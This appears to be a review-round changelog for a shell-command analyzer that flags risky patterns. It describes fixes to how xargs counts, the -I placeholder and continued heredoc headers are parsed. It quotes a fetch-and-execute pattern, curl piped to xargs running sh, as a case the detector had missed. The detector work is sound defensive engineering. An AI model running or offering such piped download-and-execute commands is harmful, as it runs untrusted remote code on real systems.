## Review Round Two — Three Continued-Header and xargs-Arity Fixes (2026-08-31)

Re-review of the integrated Stage A range confirmed the original four
reproductions fixed and the facade structural gap closed, and found three
remaining behavioral defects. Each was probed against the local GNU
toolchain before fixing, then pinned at the analyzer layer
(`detect::tests::round_fifteen_tests`, 7 tests) and end to end (new
`heredoc-continued-headers` CLI fixture with both directions of the
defect).

1. **xargs counts are numbers, not spellings (P1).** `xargs_placeholder`
   compared `-n`/`--max-args` counts to the literal string `"1"`, so GNU
   spellings of numeric one (`-n01`, `-n +1`, `--max-args=01`,
   `--max-args +1`) dropped the `-I` placeholder and hid
   `curl | xargs -I{} -n01 sh -c '{}'`. A shared `xargs_count` helper now
   parses `strtol`-style counts (optional `+`, leading zeros) and is used
   by the placeholder precedence check, `set_word_batch`, and
   `set_line_batch`; invalid counts (`1x`, `0`) still stay silent because
   a failed xargs run executes no input.

2. **A separate `-I` value is consumed, not rescanned (P1).** The
   placeholder scan advanced one argument per option, so a dash-leading
   replacement word was reinterpreted as an option
   (`xargs -I -n sh -c '-n'` cleared the placeholder that GNU keeps).
   The scan now honors option arity like `xargs_wrapped_command` already
   does: bare `-I`/`-n`/`-L`/`--max-args`/`--max-lines` consume their
   separate value word; `--replace` still never does (GNU takes its value
   only after `=`).

3. **Heredoc bodies follow the complete continued command (P2).** Body
   capture started on the line after the header line, so a
   backslash-continued header (`cat <<A | \` + `cat <<B`) read bodies too
   early and missed later unit lines' heredocs entirely. The reworked
   `shell_source_without_heredoc_payloads` now probes the unit state to
   find the command's last physical line first, collects every heredoc of
   the unit across its lines (with per-line raw-scan/token agreement, any
   disagreement leaving the whole unit untouched), captures bodies after
   that line, classifies ownership and override over the JOINED command
   text, and rewrites each unit line in place — reproducing the original
   span line for line with the same earliest-first blank absorption.
   An EOF inside the header leaves the rest of the file alone.

Verified before fixing: local GNU xargs preserves `-I` under `-n01`,
`-n +1`, and `--max-args=+1` and errors on `1x`/`0`; it substitutes a
dash-leading `-I` replstr; bash reads both bodies of
`cat <<A | \` + `cat <<B` after the second line and executes both bodies
of `sh <<A; \` + `sh <<B`.

Full verification gate in both feature configurations:

```text
cargo fmt --all -- --check                               # exit 0
cargo clippy --workspace --all-targets -- -D warnings    # both configs
cargo test --workspace                                   # 222/212 analyzer, 75 CLI
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
git diff --check                                         # clean
```
